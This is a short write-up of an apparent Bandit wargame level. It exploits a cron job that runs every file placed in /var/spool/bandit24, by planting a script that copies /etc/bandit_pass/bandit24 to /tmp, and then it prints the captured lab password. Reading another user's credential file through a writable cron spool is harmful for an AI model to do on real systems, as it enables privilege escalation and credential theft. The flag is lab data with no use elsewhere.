From the previous levels we know the bandit procedure for cronjob, let's just get right to the script.

1) `cat /usr/bin/cronjob_bandit24.sh`

    #!/bin/bash

    myname=$(whoami)

    cd /var/spool/$myname
    echo "Executing and deleting all scripts in /var/spool/$myname:"
    for i in *;
    do
      echo "Handling $i"
      ./$i
      rm -f $i
    done

Basically, the cronjob deletes all the files in in `/var/spool/<owner_of_cronjob>` after executing them.

Luckily for us, the owner of the cronjob is bandit24, who's password we need. So let's first `cd` into his directory in order to make the script for the cronjob to run.


2) `cd /var/spool/bandit24`

Now let's make the executable

3) `touch getFlag.sh && nano getFlag.sh`

4) Make a script as follows:

    #!/bin/bash

    cat /etc/bandit_pass/bandit24 > /tmp/passForBandit24

After the cronjob runs the script, we get the flag by

5) `cat /tmp/passForBandit24`

Flag: **UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ**
